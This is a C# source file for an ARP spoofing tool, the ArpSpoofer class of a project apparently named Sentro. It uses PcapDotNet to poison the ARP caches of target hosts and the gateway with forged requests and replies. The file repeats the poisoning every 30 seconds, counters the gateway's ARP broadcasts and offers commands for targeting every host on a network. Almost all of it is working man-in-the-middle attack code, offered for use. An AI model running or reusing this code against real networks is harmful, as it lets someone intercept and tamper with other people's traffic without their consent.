using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading.Tasks;
using PcapDotNet.Base;
using PcapDotNet.Core;
using PcapDotNet.Core.Extensions;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Arp;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.IpV4;
using Sentro.Utilities;

namespace Sentro.ARPSpoofer
{
    /*
        Responsipility : Perform ARP Cache Poison attack         
        TODO: what if a machine changed it's ip address with another machine (rare case)
        TODO: implement a function to find mac address of list of targets at once (performace)
        TODO: implement exclude to immediate remove from static arp table
    */

    public class ArpSpoofer : IArpSpoofer
    {
        public const string Tag = "ArpSpoofer";
        private static ArpSpoofer _arpSpoofer;
        private Dictionary<string, string> _targetsIpToMac;
        private HashSet<string> _excludedTargets;
        private HashSet<string> _targetsIps;
        private string _myIp, _myMac, _gatewayIp, _gatewayMac;        

        /*packet builders grouped here to avoid creating a new builder with each packet sent*/
        private Dictionary<string, PacketBuilder> _targetsPacketBuilders;
        private Dictionary<string, PacketBuilder> _gatewayPacketBuilders;

        /*report the detection or removal of current targeted machines,
          targets list is rebuild in case of change*/
        private bool _targetsChanged;

        /*report the status of ARP spoofer */
        private Status _status = Status.Off;

        private ArpSpoofer()
        {
            ConsoleLogger.GetInstance().Debug(Tag, "initializing");
            _targetsIpToMac = new Dictionary<string, string>();
            _excludedTargets = new HashSet<string>();
            _targetsPacketBuilders = new Dictionary<string, PacketBuilder>();
            _gatewayPacketBuilders = new Dictionary<string, PacketBuilder>();

        }

        public static ArpSpoofer GetInstance()
        {
            return _arpSpoofer ?? (_arpSpoofer = new ArpSpoofer());
        }

        private void InsertAllStaticMacAddresses(NetworkInterface networkInterface)
        {
            ConsoleLogger.GetInstance().Debug(Tag, "inserting static mac addresses .. ");                       
            NetworkUtilites.InsertStaticMac(networkInterface, _gatewayIp, _gatewayMac);
            foreach (var t in _targetsIps)
                NetworkUtilites.InsertStaticMac(networkInterface, t, _targetsIpToMac[t]);
        }

        private void DeleteAllStaticMacAddresses(NetworkInterface networkInterface)
        {
            ConsoleLogger.GetInstance().Debug(Tag, "deleting static mac addresses .. ");
            NetworkUtilites.DeleteStaticMac(networkInterface, _gatewayIp);
            foreach (var t in _targetsIps)
                NetworkUtilites.DeleteStaticMac(networkInterface, t);

        }

        private void SpoofAllFakeAddresses(NetworkInterface networkInterface, PacketCommunicator communicator)
        {            
            ConsoleLogger.GetInstance().Debug(Tag, "spoofing with arp requests ..");
            foreach (string target in _targetsIps)
            {
                if (MakeSureTargetIsReadyToBeAttacked(networkInterface, target) == false)
                    continue;
                SpoofGatewayInitialRequest(communicator, target);
                SpoofTargetInitialRequest(communicator, target);
            }
        }

        private void SpoofFakeAddress(NetworkInterface networkInterface, PacketCommunicator communicator, string target)
        {            
            if (MakeSureTargetIsReadyToBeAttacked(networkInterface, target) == false)
                return;
            SpoofGatewayInitialRequest(communicator, target);
            SpoofTargetInitialRequest(communicator, target);
        }

        private void SpoofRealAddresses(PacketCommunicator communicator)
        {
            ConsoleLogger.GetInstance().Debug(Tag, "spoofing with real requests ..");
            foreach (string target in _targetsIps)
            {                
                SpoofGatewayFinalRequest(communicator, target);
                SpoofTargetFinalRequest(communicator, target);
            }            
        }

        private void SpoofRealAddress(PacketCommunicator communicator, string target)
        {            
            SpoofGatewayFinalRequest(communicator, target);
            SpoofTargetFinalRequest(communicator, target);
        }

        private void SpoofContinuousAttack(PacketCommunicator communicator,NetworkInterface networkInterface)
        {
            Task.Run(() =>
            {
                /*convert to array so that adding a new ip will not affect the for loop*/
                string[] targetsArray = _targetsIps.ToArray();
                var logger = ConsoleLogger.GetInstance();
                _status = Status.Started;
                while (_status == Status.Started || _status == Status.Starting || _status == Status.Paused)
                {
                    if (_status == Status.Paused)
                    {
                        Task.Delay(5000).Wait();                        
                        continue;
                    }

                    if (_targetsChanged)
                        targetsArray = _targetsIps.ToArray();

                    foreach (string target in targetsArray)
                    {
                        logger.Debug(Tag, $"spoofing {target} with reply");
                        if (MakeSureTargetIsReadyToBeAttacked(networkInterface, target) == false)
                            continue;
                        SpoofGateway(communicator, target);
                        SpoofTarget(communicator, target);

                    }

                    var delayDuration = 30000; //Convert.ToInt32(settings.Setting.arpSpoofer.frequency);
                    logger.Debug(Tag, $"sleeping for {delayDuration/1000}s");
                    Task.Delay(delayDuration).Wait();
                }
            }).Wait();            
        }

        public void Spoof(string myIp, HashSet<string> targets)//hashset is used to eliminate duplicate IPs
        {
            var logger = ConsoleLogger.GetInstance();

            if (_status != Status.Off)
            {
                logger.Info(Tag,"Single instance of arp spoofer is allowed to run");
                return;                
            }            
                        
            _status = Status.Starting;
            logger.Debug(Tag, "arp attack starting ..");

            var livePacketDevice = NetworkUtilites.GetLivePacketDevice(myIp);                       
            
            _targetsIps = targets;
            _myIp = myIp;
            _myMac = livePacketDevice.GetMacAddress().ToString();
            _gatewayIp = NetworkUtilites.GetGatewayIp(livePacketDevice);
            _gatewayMac = NetworkUtilites.GetMacAddress(_gatewayIp);

            /*targets rarely change their mac address, also this function considerd costly*/            
            logger.Debug(Tag, "looking for mac addresses ..");
            foreach (var ip in targets)
                _targetsIpToMac.Add(ip, NetworkUtilites.GetMacAddress(ip));

            var networkInterface = livePacketDevice.GetNetworkInterface();                                  
        
            PacketCommunicator communicator = livePacketDevice.Open(50, PacketDeviceOpenAttributes.None, 50);

            BeforeAllAttack(livePacketDevice,communicator);

            SpoofContinuousAttack(communicator, networkInterface);/*block*/

            if (_status != Status.Stopped)
                AfterAttack(networkInterface, communicator);
                  
            communicator.Dispose();

        }             

        private void BeforeAllAttack(LivePacketDevice livePacketDevice, PacketCommunicator communicator)
        {
            var networkInterface = livePacketDevice.GetNetworkInterface();
            Task.Run(() => FightBackAnnoyingBroadcasts(livePacketDevice));

            InsertAllStaticMacAddresses(networkInterface);
            SpoofAllFakeAddresses(networkInterface, communicator);
        }
      
        private void AfterAttack(NetworkInterface networkInterface, PacketCommunicator communicator)
        {
            SpoofRealAddresses(communicator);
            DeleteAllStaticMacAddresses(networkInterface);
            _status = Status.Stopped;
        }

        private void AfterAttack(NetworkInterface networkInterface, PacketCommunicator communicator,string target)
        {
            SpoofRealAddress(communicator,target);
            NetworkUtilites.DeleteStaticMac(networkInterface,target);            
        }

        private void FightBackAnnoyingBroadcasts(LivePacketDevice nic)
        {
            ILogger logger = ConsoleLogger.GetInstance();
            var ether = new EthernetLayer
            {
                Source = new MacAddress(_myMac),
                Destination = new MacAddress("FF:FF:FF:FF:FF:FF"),
                EtherType = EthernetType.None
            };

            logger.Debug(Tag, "hunting arp broadcasts ..");

            PacketCommunicator communicator = nic.Open(500, PacketDeviceOpenAttributes.None, 50);
            communicator.SetFilter("arp && ether dst ff:ff:ff:ff:ff:ff");

            communicator.ReceivePackets(0, arp =>
            {
                var sourceIp = arp.Ethernet.IpV4.Source.ToString();
                if (sourceIp.Equals(_gatewayIp))
                {
                    var arplayer = new ArpLayer
                    {
                        ProtocolType = EthernetType.IpV4,
                        Operation = ArpOperation.Request,
                        SenderHardwareAddress = ether.Source.ToBytes(),
                        SenderProtocolAddress = new IpV4Address(_gatewayIp).ToBytes(),
                        TargetHardwareAddress = MacAddress.Zero.ToBytes(),
                        TargetProtocolAddress = arp.Ethernet.IpV4.Destination.ToBytes()
                    };
                    var packet = new PacketBuilder(ether, arplayer).Build(DateTime.Now);
                    communicator.SendPacket(packet);
                }
                else if (_targetsIpToMac.ContainsKey(sourceIp))
                {
                    SpoofGateway(communicator, sourceIp);
                }
            });            
            communicator.Dispose();
        }

        private void SpoofGatewayInitialRequest(PacketCommunicator communicator, string targetIp)
        {
            /*put everything in queue and let .Net manage threads*/
            Task.Factory.StartNew(() =>
            {
                var ether = new EthernetLayer
                {
                    Source = new MacAddress(_myMac),
                    Destination = new MacAddress(_gatewayMac),
                    EtherType = EthernetType.None,
                };
                var arp = new ArpLayer
                {
                    ProtocolType = EthernetType.IpV4,
                    Operation = ArpOperation.Request,
                    SenderHardwareAddress = ether.Source.ToBytes(),
                    SenderProtocolAddress = new IpV4Address(targetIp).ToBytes(),
                    TargetHardwareAddress = MacAddress.Zero.ToBytes(),
                    TargetProtocolAddress = new IpV4Address(_gatewayIp).ToBytes()
                };
                var packet = new PacketBuilder(ether, arp).Build(DateTime.Now);
                communicator.SendPacket(packet);
            });
        }

        private void SpoofTargetInitialRequest(PacketCommunicator communicator, string targetIp)
        {
            /*put everything in queue and let .Net manage threads*/
            Task.Factory.StartNew(() =>
            {
                var ether = new EthernetLayer
                {
                    Source = new MacAddress(_myMac),
                    Destination = new MacAddress(_targetsIpToMac[targetIp]),
                    EtherType = EthernetType.None,
                };
                var arp = new ArpLayer
                {
                    ProtocolType = EthernetType.IpV4,
                    Operation = ArpOperation.Request,
                    SenderHardwareAddress = ether.Source.ToBytes(),
                    SenderProtocolAddress = new IpV4Address(_gatewayIp).ToBytes(),
                    TargetHardwareAddress = MacAddress.Zero.ToBytes(),
                    TargetProtocolAddress = new IpV4Address(targetIp).ToBytes()
                };
                var packet = new PacketBuilder(ether, arp).Build(DateTime.Now);
                communicator.SendPacket(packet);
            });
        }

        private void SpoofGateway(PacketCommunicator communicator, string targetIp)
        { /*put everything in queue and let .Net manage threads*/
            Task.Factory.StartNew(() =>
            {
                if (!_gatewayPacketBuilders.ContainsKey(targetIp))
                {
                    var ether = new EthernetLayer
                    {
                        Source = new MacAddress(_myMac),
                        Destination = new MacAddress(_gatewayMac),
                        EtherType = EthernetType.None,
                    };
                    var arp = new ArpLayer
                    {
                        ProtocolType = EthernetType.IpV4,
                        Operation = ArpOperation.Reply,
                        SenderHardwareAddress = ether.Source.ToBytes(),
                        SenderProtocolAddress = new IpV4Address(targetIp).ToBytes(),
                        TargetHardwareAddress = ether.Destination.ToBytes(),
                        TargetProtocolAddress = new IpV4Address(_gatewayIp).ToBytes()
                    };

                    _gatewayPacketBuilders.Add(targetIp, new PacketBuilder(ether, arp));
                }

                var packet = _gatewayPacketBuilders[targetIp].Build(DateTime.Now);
                communicator.SendPacket(packet);
            });
        }

        private void SpoofTarget(PacketCommunicator communicator, string targetIp)
        {
            /*put everything in queue and let .Net manage threads*/
            Task.Factory.StartNew(() =>
            {
                if (!_targetsPacketBuilders.ContainsKey(targetIp))
                {
                    var ether = new EthernetLayer
                    {
                        Source = new MacAddress(_myMac),
                        Destination = new MacAddress(_targetsIpToMac[targetIp]),
                        EtherType = EthernetType.None,
                    };
                    var arp = new ArpLayer
                    {
                        ProtocolType = EthernetType.IpV4,
                        Operation = ArpOperation.Reply,
                        SenderHardwareAddress = ether.Source.ToBytes(),
                        SenderProtocolAddress = new IpV4Address(_gatewayIp).ToBytes(),
                        TargetHardwareAddress = ether.Destination.ToBytes(),
                        TargetProtocolAddress = new IpV4Address(targetIp).ToBytes()
                    };

                    _targetsPacketBuilders.Add(targetIp, new PacketBuilder(ether, arp));
                }

                var packet = _targetsPacketBuilders[targetIp].Build(DateTime.Now);
                communicator.SendPacket(packet);
            });
        }

        private void SpoofGatewayFinalRequest(PacketCommunicator communicator, string targetIp)
        {
            /*put everything in queue and let .Net manage threads*/
            Task.Factory.StartNew(() =>
            {
                var ether = new EthernetLayer
                {
                    Source = new MacAddress(_myMac),
                    Destination = new MacAddress(_gatewayMac),
                    EtherType = EthernetType.None,
                };
                var arp = new ArpLayer
                {
                    ProtocolType = EthernetType.IpV4,
                    Operation = ArpOperation.Request,
                    SenderHardwareAddress = new MacAddress(_targetsIpToMac[targetIp]).ToBytes(),
                    SenderProtocolAddress = new IpV4Address(targetIp).ToBytes(),
                    TargetHardwareAddress = MacAddress.Zero.ToBytes(),
                    TargetProtocolAddress = new IpV4Address(_gatewayIp).ToBytes()
                };
                var packet = new PacketBuilder(ether, arp).Build(DateTime.Now);
                communicator.SendPacket(packet);
            });
        }

        private void SpoofTargetFinalRequest(PacketCommunicator communicator, string targetIp)
        {
            /*put everything in queue and let .Net manage threads*/
            Task.Factory.StartNew(() =>
            {
                var ether = new EthernetLayer
                {
                    Source = new MacAddress(_myMac),
                    Destination = new MacAddress(_targetsIpToMac[targetIp]),
                    EtherType = EthernetType.None,
                };
                var arp = new ArpLayer
                {
                    ProtocolType = EthernetType.IpV4,
                    Operation = ArpOperation.Request,
                    SenderHardwareAddress = new MacAddress(_gatewayMac).ToBytes(),
                    SenderProtocolAddress = new IpV4Address(_gatewayIp).ToBytes(),
                    TargetHardwareAddress = MacAddress.Zero.ToBytes(),
                    TargetProtocolAddress = new IpV4Address(targetIp).ToBytes()
                };
                var packet = new PacketBuilder(ether, arp).Build(DateTime.Now);
                communicator.SendPacket(packet);
            });
        }

        private bool MakeSureTargetIsReadyToBeAttacked(NetworkInterface networkInterface, string target)
        {
            if (!_targetsIpToMac[target].IsNullOrEmpty()) return true;

            var mac = NetworkUtilites.GetMacAddress(target);
            if (mac.Length <= 0)
                return false;

            _targetsIpToMac[target] = mac;
            NetworkUtilites.InsertStaticMac(networkInterface, target, _targetsIpToMac[target]);
            return true;
        }

        public void Spoof(string myIp)
        {
            throw new NotImplementedException();
        }

        public void Include(string target)
        {
            _targetsIps.Add(target);
            _targetsChanged = true;
        }

        public void Include(HashSet<string> targets)
        {
            _targetsIps.UnionWith(targets);
            _targetsChanged = true;
        }

        public void Exclude(string target)
        {
            _targetsIps.Remove(target);
            _excludedTargets.Add(target);
            _targetsChanged = true;                                
        }

        public void Exclude(HashSet<string> targets)
        {
            _targetsIps.ExceptWith(targets);
            _excludedTargets.UnionWith(targets);
            _targetsChanged = true;
        }

        public void Stop()
        {
            _status = Status.Stopping;
            var livePacketDevice = NetworkUtilites.GetLivePacketDevice(_myIp);
            PacketCommunicator communicator = livePacketDevice.Open(1, PacketDeviceOpenAttributes.None, 10);
            AfterAttack(livePacketDevice.GetNetworkInterface(), communicator);
            communicator.Dispose();
        }

        public void Pause() => _status = Status.Paused;

        public void Resume() => _status = Status.Starting;

        public void Start() => _status = Status.Starting;

        public void Usage()
        {
            var usage = @"
arp [Your IP] spoof [Set of target ips]
arp [Your IP] spoof all -[Exclude target ip] .. -[Exclude target ip]
arp +[Include target ip] .. +[Include target ip] .. -[Exclude target ip]
arp stop
arp pause
arp start
arp resume
arp
";
            Console.WriteLine(usage);
        }

        public Status State() => _status;

        public enum Status
        {
            Paused,
            Stopped,
            Stopping,
            Starting,
            Started,
            Off
        }

    }
}
